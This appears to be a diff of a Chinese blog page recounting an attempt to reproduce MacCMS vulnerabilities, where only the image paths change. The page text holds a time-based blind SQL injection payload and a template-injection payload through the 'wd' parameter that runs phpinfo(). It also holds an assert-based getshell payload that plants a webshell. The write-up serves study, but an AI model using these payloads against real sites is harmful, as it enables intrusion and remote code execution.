@@ -216,16 +216,16 @@
 <p>整理一下的语句</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> ( instr(a_name,<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0)#\ '</span>)&gt;<span class="number">0</span> <span class="keyword">or</span> instr(a_subname,<span class="string">'))  /////这边是单引号闭合部分</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0) 有效部分</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#%25%35%63'</span>)&gt;<span class="number">0</span> ) <span class="comment">////// 后面都被注释掉了</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="E:maccms%5C1.png" alt></p>
+<p><img src="/.com//E:maccms%5C1.png" alt></p>
 <h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>在复现以上漏洞的时候查了一些博客,发现这个CMS还存在任意代码执行,但是已经被修复了,就是添加了<strong>StopAttack()</strong>这个函数之后解决了这个问题.<br>把该函数注释掉以后就可以复现该漏洞了.<br>问题还是出在wd的参数可控构造满足正则的语句就可以被执行</p>
 <p>payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wd=&#123;<span class="keyword">if</span>-A:phpinfo()&#125;&#123;<span class="keyword">endif</span>-A&#125;</span><br></pre></td></tr></table></figure>
 
 <p> 这是可以执行phpinfo()的.把phpinfo()换成其他语句就可以getshell了</p>
-<p><img src="maccms/2.png" alt></p>
+<p><img src="/.com//2.png" alt></p>
 <h3 id="getshell-payload"><a href="#getshell-payload" class="headerlink" title="getshell_payload"></a>getshell_payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wd=&#123;<span class="keyword">if</span>-A:assert($_POST[zhhhy])&#125;&#123;<span class="keyword">endif</span>-A&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="maccms/3.png" alt></p>
+<p><img src="/.com//3.png" alt></p>
 <h2 id="最后还是没复现成功-真的是很心塞啊"><a href="#最后还是没复现成功-真的是很心塞啊" class="headerlink" title="最后还是没复现成功,真的是很心塞啊!"></a>最后还是没复现成功,真的是很心塞啊!</h2><p>   我觉得这个文章的顺序有点问题.. 作者先是一眼看出拼接进去的lp[wd]存在注入,再回头溯源发现wd是可控的.可能还是我太菜了.<br>   按我理解的应该是抓取搜索框发出的包,发现wd参数可控,再到源码层里去追踪wd参数的去向,并记录一下该参数被哪些函数处理过.</p>
 
         </section>
